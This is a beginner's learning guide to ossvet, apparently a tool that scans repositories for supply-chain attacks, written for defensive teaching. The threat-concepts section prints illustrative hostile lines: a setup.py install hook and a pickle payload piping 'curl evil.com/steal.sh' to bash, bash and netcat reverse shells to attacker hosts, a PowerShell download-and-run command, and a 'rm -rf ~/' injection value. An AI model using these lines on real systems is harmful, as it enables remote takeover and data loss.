# ossvet — Learning Guide
*A beginner-friendly deep-dive into the cybersecurity concepts, Python ecosystem, and code architecture behind ossvet.*

---

## Table of Contents

1. [The Python Ecosystem — pip, PyPI, pipx](#1-the-python-ecosystem)
2. [How the Project is Structured](#2-project-structure)
3. [File-by-file walkthrough](#3-file-by-file-walkthrough)
4. [The Cybersecurity Concepts](#4-the-cybersecurity-concepts)
5. [How the Scanners Work — One by One](#5-how-the-scanners-work)
6. [How Risk Scoring Works](#6-how-risk-scoring-works)
7. [The External Tools — What Are They?](#7-the-external-tools)
8. [Key Security Principles in the Code](#8-key-security-principles-in-the-code)

---

## 1. The Python Ecosystem

### What is Python code, really?

When you write Python, it's just text files ending in `.py`. Python itself is already installed on your computer. But most Python programs need *extra libraries* — other people's code that does specific things (make HTTP requests, parse JSON, draw tables in the terminal, etc.).

### What is PyPI?

**PyPI** (Python Package Index, at [pypi.org](https://pypi.org)) is like the **App Store for Python libraries**. Anyone can upload a package there. When you run `pip install requests`, pip goes to PyPI, downloads the `requests` package, and installs it on your machine.

```
Your code
    │  needs: requests, pydantic, typer…
    ▼
pip install <name>
    │
    ▼
PyPI (pypi.org) — 500,000+ packages uploaded by anyone
    │
    ▼
Downloaded to your machine's Python environment
```

> **Security relevance:** Because *anyone* can upload to PyPI, malicious actors upload packages with names very close to popular ones. `requests` is famous — `requestes`, `requests2`, `python-requests2` are all different (potentially malicious) packages. This is called **typosquatting** (covered below).

### What is pip?

`pip` is the **package installer** that comes with Python. It downloads and installs packages from PyPI.

```bash
pip install requests          # install a package
pip uninstall requests        # remove it
pip list                      # see what's installed
pip install -e .              # install THIS folder as a package in "editable" mode
```

`pip install -e .` (the `-e` means "editable") means: *install this directory as a package, but keep reading the source files directly*. So if you edit `ossvet/main.py`, the `ossvet` command picks up the change immediately — no reinstall needed. This is standard for development.

### What is pipx?

`pipx` solves a problem: if you `pip install` lots of CLI tools, they share the same Python environment and can conflict. `pipx` installs each CLI tool in its own **isolated environment** but still makes the command available system-wide.

```
pip install ossvet   → goes into your Python's shared site-packages (can conflict)
pipx install ossvet  → goes into ~/.local/pipx/venvs/ossvet/ (isolated, no conflict)
```

For CLI tools you use but don't develop (semgrep, mypy, ruff, ossvet), `pipx` is the right choice.

### What is pyproject.toml?

Before Python had a standard, projects used `setup.py`, `setup.cfg`, `requirements.txt` — a mess. **pyproject.toml** (introduced in PEP 518) is the modern single-file standard that says:

- What Python version is required
- What libraries this package depends on
- How to build/install it
- Configuration for linters, test runners, etc.

When you run `pip install -e .`, pip reads `pyproject.toml` to know what to do.

---

## 2. Project Structure

```
ossvet/                         ← the git repository root
├── pyproject.toml              ← "manifest": deps, build config, tool settings
├── README.md                   ← user-facing docs
├── LICENSE                     ← MIT open source license
│
├── ossvet/                     ← the actual Python package (importable as `import ossvet`)
│   ├── __init__.py             ← makes this a package; defines __version__
│   ├── main.py                 ← CLI entrypoint (Typer commands: scan, doctor, version)
│   ├── models.py               ← data shapes (Pydantic): Finding, ScanResult, Verdict…
│   ├── config.py               ← all constants: patterns, weights, thresholds, Unicode chars
│   ├── clone.py                ← safely clones a GitHub repo into a temp dir
│   ├── github_api.py           ← talks to the GitHub REST API to validate URLs + get metadata
│   ├── scoring.py              ← turns a list of findings into a risk score + verdict
│   ├── reporting.py            ← writes report.md, report.json, SKILL.md
│   ├── data/
│   │   ├── popular_pypi.json   ← ~200 most-downloaded PyPI packages (for typosquat detection)
│   │   └── popular_npm.json    ← ~200 most-downloaded npm packages
│   └── scanners/
│       ├── base.py             ← abstract base class all scanners inherit; subprocess helper
│       ├── risky_files.py      ← inspects dangerous file patterns (no execution)
│       ├── patterns.py         ← regex grep across source files
│       ├── unicode_trojan.py   ← CVE-2021-42574 Trojan Source detection
│       ├── dependency_hygiene.py ← typosquat + unpinned deps
│       ├── provenance.py       ← GitHub API signals (account age, stars, contributors)
│       ├── semgrep.py          ← wraps the semgrep binary
│       ├── gitleaks.py         ← wraps the gitleaks binary
│       ├── syft.py             ← wraps the syft binary
│       ├── grype.py            ← wraps the grype binary
│       ├── scorecard.py        ← wraps the scorecard binary
│       └── modelscan.py        ← wraps the modelscan binary
│
└── tests/
    ├── fixtures/
    │   ├── clean_repo/         ← a tiny safe repo (happy path)
    │   └── malicious_repo/     ← a repo with every red flag (red path)
    └── test_*.py               ← pytest test files
```

**Key insight:** the outer `ossvet/` is the *project folder* (git repo). The inner `ossvet/` is the *Python package*. This is standard Python convention — the package lives inside the project.

---

## 3. File-by-File Walkthrough

### `ossvet/__init__.py`
Just one line: `__version__ = "0.1.0"`. Making a directory a Python package requires an `__init__.py`. It also centralises the version string.

### `ossvet/models.py` — Pydantic data models

This defines the **shapes of data** flowing through the app. It uses **Pydantic v2**, a library that:
- Validates that fields have the right types
- Converts Python objects to/from JSON automatically
- Gives clear error messages when data doesn't match

```python
class Finding(BaseModel):
    scanner: str           # which scanner found it
    category: str          # e.g. "reverse_shell", "cve_critical"
    severity: Severity     # INFO / LOW / MEDIUM / HIGH / CRITICAL
    title: str             # short human-readable summary
    description: str       # longer explanation
    file_path: str | None  # which file it was in
    line_number: int | None
```

Think of `Finding` like a standardised incident report form — no matter which scanner raises an alarm, it fills out the same form.

`ScanResult` is the master container: it holds every `ScannerResult` (one per scanner) plus aggregated `all_findings`, the final `risk_score`, and `verdict`.

### `ossvet/config.py` — The brain's constants

This is where all the policy decisions live:
- `SUSPICIOUS_PATTERNS`: the 24 regex patterns we grep for
- `SCORING_WEIGHTS`: how many points each finding category contributes
- `BIDI_CONTROL_CHARS`: the Unicode codepoints used in Trojan Source attacks
- `HARD_BLOCK_CATEGORIES`: categories that force BLOCK regardless of score
- `DEFAULT_TIMEOUT`: 60 seconds per scanner subprocess

Putting everything here means you can tune the tool's sensitivity in one file.

### `ossvet/github_api.py` — Talking to GitHub

Before cloning anything, we ask the **GitHub REST API** (a free, no-auth-required HTTP endpoint) about the repo:

```
GET https://api.github.com/repos/owner/name
→ JSON with: size, created_at, pushed_at, stargazers_count, fork info, license…
```

This file does two things:

1. **`validate_repo_url(url)`** — checks the URL matches a strict regex *before* passing it to any external tool. This prevents an attacker from crafting a URL that smuggles extra git options.

2. **`get_repo_meta(owner, name)`** — fetches the JSON, also queries `/contributors` and `/users/{owner}`. Returns a `RepoMeta` dataclass.

Why does the API exist at all? GitHub exposes metadata about every public repo for free so developers can build tools, dashboards, and automation. We're using it the same way a CI system would.

### `ossvet/clone.py` — Safe cloning

This is a Python **context manager** (the `with clone_repo(url) as info:` pattern). It:

1. Validates the URL again (defence-in-depth)
2. Creates a temp directory: `tempfile.mkdtemp(prefix="ossvet-")` → something like `/tmp/ossvet-a3f7b2c/`
3. Runs `git clone --depth=1 --no-tags --single-branch -- <url> <tmp>` as a subprocess
4. Reads the commit SHA with `git rev-parse HEAD`
5. **Guarantees cleanup** in a `try/finally` block — even if an exception is thrown, the temp dir is deleted

```python
with clone_repo("https://github.com/org/repo") as info:
    # info.path = Path("/tmp/ossvet-abc123/repo")
    # info.commit_sha = "a3f7b2c9..."
    do_stuff(info.path)
# ← temp dir is automatically deleted here
```

**Why `--depth=1`?** A "shallow clone" only fetches the latest commit, not the full git history. This is faster and uses less disk space. The tradeoff is that gitleaks can't scan old commits (we pass `--no-git` to work around this).

### `ossvet/scanners/base.py` — The scanner contract

All 11 scanners inherit from `BaseScanner`:

```python
class BaseScanner(ABC):
    name: str              # e.g. "semgrep"
    required_tool: str | None  # e.g. "semgrep"; None if pure-Python

    def is_available(self) -> bool: ...   # can this scanner run?
    def run(self, repo_path, **kwargs) -> ScannerResult: ...  # do the scan
```

`base.py` also contains two key shared utilities:

**`safe_run_subprocess(args, timeout)`** — Every shell command in ossvet goes through here. It enforces:
- `shell=False` — the command is passed as a list, not a string. This prevents *shell injection* (see below).
- Hard timeout — if a scanner hangs, it gets killed after N seconds
- ANSI stripping — external tools sometimes output colour escape codes; we strip them so they can't inject malicious terminal sequences
- Never raises — wraps everything in try/except so one broken scanner can't crash the whole scan

**`iter_text_files(repo_path)`** — Walks the directory tree and yields files that are safe to read:
- Skips `.git/`, `node_modules/`, `.venv/`, `build/` (irrelevant or huge)
- Skips symlinks (could point outside the repo root — a **path traversal** attack)
- Skips binary files (detected by looking for null bytes `\x00` in the first 8KB)
- Skips files >2 MB (prevents memory exhaustion on minified bundles)

### `ossvet/scoring.py` — Adding up the risk

```python
def compute_risk(findings) -> (score, verdict):
    score_by_cat = {}
    for f in findings:
        cfg = SCORING_WEIGHTS[f.category]  # e.g. {"per_finding": 10, "cap": 30}
        score_by_cat[cat] = min(
            score_by_cat.get(cat, 0) + cfg["per_finding"],
            cfg["cap"]   # ← category can never contribute more than its cap
        )
    total = min(sum(score_by_cat.values()), 100)
    verdict = LOW_RISK / REVIEW / BLOCK based on thresholds
    if any hard-block category present → force BLOCK
    return total, verdict
```

The **cap per category** prevents one noisy scanner from dominating the score. If semgrep finds 50 warnings, you don't get a score of 100 from warnings alone — the `semgrep_warning` category is capped at 10.

### `ossvet/reporting.py` — Writing the output

Three writers:
- **`write_json`**: calls Pydantic's `.model_dump_json()` — automatic, lossless, structured
- **`write_markdown`**: f-string template that builds a readable `.md` report with sections for each finding category, a scanner status table, and recommendations
- **`write_skill_md`**: the "security passport" — meant to be committed alongside the dependency in your own repo to document that it was vetted

---

## 4. The Cybersecurity Concepts

### Supply-chain attacks — the big picture

A **supply-chain attack** targets you by compromising something *you depend on*, rather than attacking you directly. Instead of hacking your server, the attacker hacks a library you use.

Famous examples:
- **SolarWinds (2020)**: Attackers inserted a backdoor into SolarWinds' build process. 18,000 companies installed the backdoored update.
- **event-stream (2018)**: A popular npm package was transferred to a new maintainer who added a crypto-stealing payload.
- **PyPI malware (ongoing)**: Researchers find hundreds of malicious packages on PyPI every month, many typosquatting popular names.

The threat model ossvet works from: **the repo maintainer might be malicious**. Every byte is treated as untrusted.

---

### Trojan Source — CVE-2021-42574

Discovered in 2021 by researchers at Cambridge. It exploits the way text editors and code review tools display *bidirectional Unicode* — text that mixes left-to-right and right-to-left characters (like mixing English with Arabic).

**The attack:** Insert invisible Unicode control characters into source code. The *compiler/interpreter* sees the real code (which is malicious), but a *human reviewer* sees something harmless because the rendering engine reorders the characters.

```
What the reviewer sees:      if access_level != "user" { return }
What the compiler executes:  if access_level != "admin" { return }
```

The key codepoints:
- `U+202E` (RLO — Right-to-Left Override): everything after this renders right-to-left
- `U+2066`–`U+2069`: directional isolates (subtler, harder to see)
- Zero-width characters (`U+200B` ZWSP): create invisible alternative identifiers

**Why it matters:** Code review is the last line of defence before merging. If an attacker can make malicious code *look* harmless in your PR review tool, they bypass the entire review process.

---

### Typosquatting

The attack: register a package name that's one or two keystrokes away from a popular package, then put malicious code in it.

Real examples that have been found:
- `urllib2` instead of `urllib3` (real: urllib3)
- `reqeusts` instead of `requests`
- `python-dateutil2` instead of `python-dateutil`
- `crossenv` instead of `cross-env`

When you `pip install` the wrong name, your machine runs the malicious package's `setup.py` — full code execution.

**How ossvet detects it:** Levenshtein distance. "Levenshtein distance" counts the minimum number of single-character edits (insert, delete, substitute) to turn one string into another. `requestes` → `requests` is distance 1 (delete the extra `e`). Anything within distance 2 of a known-popular package name triggers a warning.

---

### Install-time code execution (setup.py hooks, postinstall scripts)

When you run `pip install somepackage`, Python runs `setup.py`. If the package author overrides the `install` command class:

```python
# setup.py
from setuptools.command.install import install
class EvilInstall(install):
    def run(self):
        import os
        os.system("curl evil.com/steal.sh | bash")  # ← runs on YOUR machine
        super().run()

setup(cmdclass={"install": EvilInstall})
```

This runs `curl evil.com/steal.sh | bash` the moment you `pip install`. npm has the same attack surface via `package.json`'s `postinstall` script field.

**The key insight:** installing a package is implicitly trusting all of its code — including code that runs *before* you've used it for anything.

---

### Secrets in repositories

Developers accidentally commit API keys, passwords, private keys, and tokens to git. Once in git history, they stay there even if you delete the file later (git history is permanent unless force-rewritten).

Common leaks:
- AWS access keys (`AKIA...` pattern — AWS keys have a fixed prefix)
- GitHub personal access tokens (`ghp_...`)
- Stripe secret keys (`sk_live_...`)
- Private SSH keys (`-----BEGIN RSA PRIVATE KEY-----`)

An attacker who finds a committed AWS key can immediately spin up EC2 instances, exfiltrate S3 data, etc. AWS charges you, not the attacker.

**gitleaks** is specifically trained to detect these patterns using entropy analysis and regular expressions tuned for each service's key format.

---

### CVEs — Common Vulnerabilities and Exposures

A **CVE** (e.g. `CVE-2021-44228`) is a public record of a known security vulnerability in specific software. The NVD (National Vulnerability Database) assigns severity scores:
- **CRITICAL** (9.0–10.0): Typically remote code execution with no authentication
- **HIGH** (7.0–8.9): Significant impact, sometimes remote
- **MEDIUM** (4.0–6.9): Requires some preconditions
- **LOW** (0.1–3.9): Limited impact

Log4Shell (`CVE-2021-44228`, CVSS 10.0) was a CRITICAL RCE in Java's log4j library — found in millions of applications worldwide. Zero-click, unauthenticated remote code execution.

**How ossvet detects CVEs:**
1. `syft` scans the repo and generates an **SBOM** (Software Bill of Materials) — a full list of every library and version in the project
2. `grype` takes that SBOM and cross-references every package version against the NVD and other vulnerability databases

---

### Reverse shells

A **reverse shell** is when an attacker's code, running on your machine, connects *outward* to the attacker's server and gives them a command prompt on your machine. "Reverse" because normally you connect *to* a server — this goes the other direction, bypassing firewalls.

Classic pattern:
```bash
bash -i >& /dev/tcp/attacker.example.com/4444 0>&1
```
This says: open a TCP connection to attacker.example.com:4444, and wire your terminal's input/output through it. The attacker types commands into their listening server; those commands run on your machine.

Other patterns:
```bash
nc -e /bin/sh attacker.com 4444   # netcat reverse shell
```
```powershell
Invoke-Expression (Invoke-WebRequest http://attacker.com/payload)  # PowerShell
```

Finding any of these in source code is nearly always malicious — they have essentially no legitimate use in a library.

---

### Time bombs

Malicious code that only activates on a certain date, hostname, or environment. Used to evade detection:
- Sandbox analysis tools run code for a short time window — a time bomb targeting 2026 would look clean in a 2025 analysis
- Hostname gates only activate on specific target machines
- Environment gates (`if CI:`) avoid triggering in automated CI environments that run tests

```python
import datetime
if datetime.date.today() > datetime.date(2026, 1, 1):
    steal_credentials()
```

---

### Obfuscation

Techniques to hide what code actually does:
- `eval(base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZicpCg=="))` — base64-encoded malicious code run via eval
- `exec(bytes.fromhex("696d706f727420..."))` — hex-encoded shellcode
- `codecs.decode("zbcbeg bf", "rot_13")` — ROT13 obfuscation (ROT13 of "import os")

The pattern `eval(base64.b64decode(...))` has virtually no legitimate use — it's almost always malicious obfuscation.

---

### CI/CD pipeline poisoning

GitHub Actions workflows (`.github/workflows/*.yml`) define automated pipelines. Two common attack vectors:

**1. `pull_request_target` with untrusted code:**
```yaml
on:
  pull_request_target:   # ← dangerous
```
`pull_request_target` runs with the *repository's* secrets and write permissions, even for PRs from *external forks*. An attacker opens a PR that modifies the workflow to steal the secrets.

**2. Script injection via `github.event` interpolation:**
```yaml
- run: echo "${{ github.event.pull_request.title }}"
```
If an attacker names their PR `"; curl evil.com/steal.sh | bash; echo "`, that shell command runs in the workflow. The title is arbitrary user input being interpolated into a shell command.

**3. Unpinned third-party actions:**
```yaml
- uses: some-org/some-action@v1   # ← bad: v1 tag can be changed
- uses: some-org/some-action@a3f7b2c91d04...  # ← good: commit SHA pinned
```
If you use `@v1` and the action's author is compromised, they push malicious code to the `v1` tag and every workflow using it is now running attacker code.

---

### Pickle-based ML model attacks

Python's `pickle` module serialises and deserialises arbitrary Python objects. The problem: pickle can serialise *code*, not just data.

```python
import pickle, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("curl evil.com/steal.sh | bash",))

payload = pickle.dumps(Exploit())
```

When someone loads a `.pkl` file with `model = pickle.load(f)`, if that file contains the above, `os.system("curl evil.com/steal.sh | bash")` runs on their machine.

**PyTorch `.pt`, `.pth` files use pickle internally.** So do joblib's `.joblib`, Keras `.h5` (partially), and `.ckpt` checkpoint files.

The safe alternative is `.safetensors` — a format designed specifically to only store tensor data, with no ability to embed executable code.

**Why this matters now:** LLMs and ML models are being shared widely on platforms like Hugging Face. A malicious "fine-tuned" model file is a trojan horse that runs code on every machine that loads it.

---

### Shell injection

The difference between:
```python
subprocess.run("git clone " + user_url, shell=True)   # ← DANGEROUS
subprocess.run(["git", "clone", user_url], shell=False)  # ← SAFE
```

With `shell=True`, Python passes the string to `/bin/sh`. If `user_url` is:
```
https://github.com/org/repo; rm -rf ~/
```
…then sh runs both `git clone https://github.com/org/repo` AND `rm -rf ~/`.

With `shell=False` and a list, each element is a separate argument passed directly to the OS. No shell involved, no injection possible.

ossvet enforces `shell=False` everywhere — including when passing the (untrusted) repo URL to git.

---

### Path traversal via symlinks

A malicious repo could contain:
```
repo/
├── evil_symlink -> /etc/passwd
```

If ossvet's file walker followed symlinks and read `evil_symlink`, it would be reading `/etc/passwd` — a file outside the repo. The scanner would then potentially include system file contents in the report.

Worse, if any tool *wrote* through a symlink pointing to something like `~/.ssh/authorized_keys`, it could modify your SSH keys.

ossvet uses `os.walk(followlinks=False)` and verifies every resolved path starts with the repo root before reading it.

---

## 5. How the Scanners Work

### `risky_files.py` — File inspection (no execution)

Walks the entire repo and inspects specific files based on their name:

**`package.json`** — parsed with `json.loads()`. Looks at `scripts.postinstall`, `scripts.preinstall`, `scripts.prepare`. These run automatically during `npm install`.

**`setup.py`** — parsed with Python's `ast` module (Abstract Syntax Tree). The AST parser converts source code into a tree of nodes *without executing it*. We walk the tree looking for:
- Class definitions that inherit from `install`, `develop`, `build_py` (setuptools command classes)
- `setup()` calls with `cmdclass=` or `dependency_links=` arguments

Using AST is critical here — we absolutely must not `import setup` or `exec(open('setup.py').read())` because that's exactly what an attacker expects you to do.

**`.github/workflows/*.yml`** — parsed with `yaml.safe_load()`. Checks for `pull_request_target`, unpinned action references, and GitHub event interpolation in `run:` steps.

### `patterns.py` — Regex grep

For every text file in the repo, for every pattern in `SUSPICIOUS_PATTERNS`, it runs a compiled regex and reports any match with its file path and line number.

The patterns are pre-compiled (`re.compile()`) once at import time for performance — compiling a regex is expensive; matching it is cheap.

### `unicode_trojan.py` — Character-level analysis

Two-pass scan per file:
1. **Line level:** check if any character on the line is in `BIDI_CONTROL_CHARS` → immediate HIGH finding
2. **Token level:** extract identifier-shaped tokens with `[\w​‌‍⁠﻿]+` (note: the character class includes zero-width chars), then check each token for zero-width chars and Cyrillic homoglyphs

### `dependency_hygiene.py` — Typosquat detection

1. **Parse imports:** use Python's `ast` module to extract all `import X` and `from X import ...` statements (safe — just reads the syntax tree)
2. **Compare against popular list:** loaded from `ossvet/data/popular_pypi.json`
3. **Levenshtein distance:** `rapidfuzz.distance.Levenshtein.distance(name, candidate)` — the `rapidfuzz` library implements this in C for speed
4. **Flag distance 1–2:** anything that close to a popular package is suspicious

### `provenance.py` — GitHub API signals

This scanner doesn't touch the repo files at all — it looks at GitHub metadata pre-fetched by `main.py`:

- **Account age < 90 days:** throwaway accounts used for one-time attacks
- **Single contributor:** no peer review; harder to spot a compromise
- **Stars / repo_age > threshold:** 1500 stars in < 30 days is statistically implausible organically → fake stars campaign → probably promoting a malicious package
- **Last push > 180 days:** stale repos are unlikely to be patching CVEs

---

## 6. How Risk Scoring Works

Each finding has a `category` (e.g. `"reverse_shell"`, `"cve_critical"`). `config.py` maps each category to a weight:

```python
SCORING_WEIGHTS = {
    "reverse_shell": {"per_finding": 25, "cap": 25},
    "bidi_control_char": {"per_finding": 30, "cap": 30},
    "cve_critical": {"per_finding": 10, "cap": 30},
    "typosquat_suspect": {"per_finding": 20, "cap": 40},
    ...
}
```

**`per_finding`** — how many points each individual finding adds.
**`cap`** — the maximum that category can contribute, no matter how many findings.

This prevents:
- A noisy scanner flooding the score (50 semgrep warnings can't give you 100)
- One category dominating unfairly

**Hard overrides:** `bidi_control_char`, `reverse_shell`, `crypto_miner` → force BLOCK regardless of score. A score of 25 with a reverse shell still gives BLOCK because if there's a reverse shell, the score is irrelevant — this repo is malicious.

---

## 7. The External Tools

These are standalone programs ossvet invokes via `subprocess`. ossvet doesn't *implement* their logic — it runs them and parses their JSON output.

### semgrep
A **semantic code analysis** tool. Unlike simple regex, semgrep understands code structure. It can match patterns like "any function that calls subprocess.run with shell=True" across Python, JavaScript, Go, Java, etc.

ossvet runs two rulesets:
- `--config=auto`: semgrep's auto-detected ruleset for the repo's languages
- `--config=p/supply-chain`: rules specifically for supply-chain attack patterns

### syft
**SBOM (Software Bill of Materials) generator.** It scans a directory and produces a list of every dependency it can find — Python packages from `requirements.txt`/`pyproject.toml`, npm packages from `package.json`, Go modules from `go.mod`, etc. — with exact versions.

Think of it as an ingredient list for a meal.

### grype
**Vulnerability scanner.** Takes syft's SBOM and looks up every package+version against CVE databases (NVD, GitHub Advisory, etc.). Outputs: "this repo depends on `requests==2.25.0` which has CVE-2023-32681 (HIGH)".

### gitleaks
**Secret scanner.** Scans every file (and optionally git history) for patterns matching known secret formats: AWS keys, GitHub tokens, Stripe keys, generic high-entropy strings that look like secrets.

### OpenSSF Scorecard
A **supply-chain health checker** from Google and the Open Source Security Foundation. It runs ~18 checks on a GitHub repo and gives each one a score 0–10:
- "Dangerous-Workflow": does the repo have dangerous GitHub Actions patterns?
- "Binary-Artifacts": are there binary blobs committed?
- "Pinned-Dependencies": are all dependencies pinned to exact versions?
- "Maintained": was the repo updated recently?

### modelscan
**ML model security scanner** by Protect AI. It opens ML weight files (`.pkl`, `.pt`, `.pth`, etc.) and inspects them for dangerous operators — specifically, pickle opcodes that would execute code when the file is loaded.

---

## 8. Key Security Principles in the Code

### Defence in depth
The URL is validated twice — once in `clone.py` and once in `github_api.py`. Even if a bug in one validator is found, the other catches it.

### Principle of least privilege
The scanner never requests write access to anything. It clones into a temp dir it owns, writes only to `reports/`, and deletes the temp dir on exit.

### Fail safe / graceful degradation
Every scanner's `run()` method wraps everything in `try/except` and returns a `ScannerResult(status="error", ...)` instead of raising. If one scanner crashes, the other 10 still run.

### Bounded resources
- Max repo size: 500 MB (checked via GitHub API before cloning)
- Max file size for text scanning: 2 MB
- Max subprocess runtime: 60 seconds per scanner
- Binary files skipped entirely

### Treating attacker input as untrusted
The scanned repo's URL, file contents, and output are all treated as potentially malicious:
- URL → strict regex, never interpolated into a shell string
- File contents → read-only, AST-parsed (not eval'd), stripped of ANSI escapes before embedding in reports
- Symlinks → rejected if they point outside the repo root

### Reproducibility
The scan is pinned to a git commit SHA. If you run `ossvet scan` twice on the same commit, you get the same result. The SKILL.md commits the SHA so future readers know exactly what was vetted.

---

## Summary

| Concept | What it is | How ossvet handles it |
|---------|-----------|----------------------|
| Supply-chain attacks | Compromise via a dependency | All 11 scanners together |
| Trojan Source | Invisible Unicode in code | `unicode_trojan.py` |
| Typosquatting | Fake package with similar name | `dependency_hygiene.py` + Levenshtein |
| Install hooks | Code runs on `pip install` | `risky_files.py` AST parser |
| CVEs | Known vulnerabilities in deps | `syft` → `grype` |
| Secrets | Leaked API keys/passwords | `gitleaks` |
| CI poisoning | Compromised GitHub Actions | `risky_files.py` YAML parser |
| Reverse shells | Remote access backdoors | `patterns.py` regex |
| Time bombs | Date/hostname-triggered malware | `patterns.py` regex |
| Obfuscation | eval(base64(...)) | `patterns.py` regex |
| ML model attacks | Malicious pickle files | `modelscan` |
| Shell injection | User input in shell commands | `shell=False` everywhere |
| Path traversal | Symlinks outside repo | `iter_text_files` symlink check |
| Provenance signals | Who made this, are they trusted? | `provenance.py` + GitHub API |
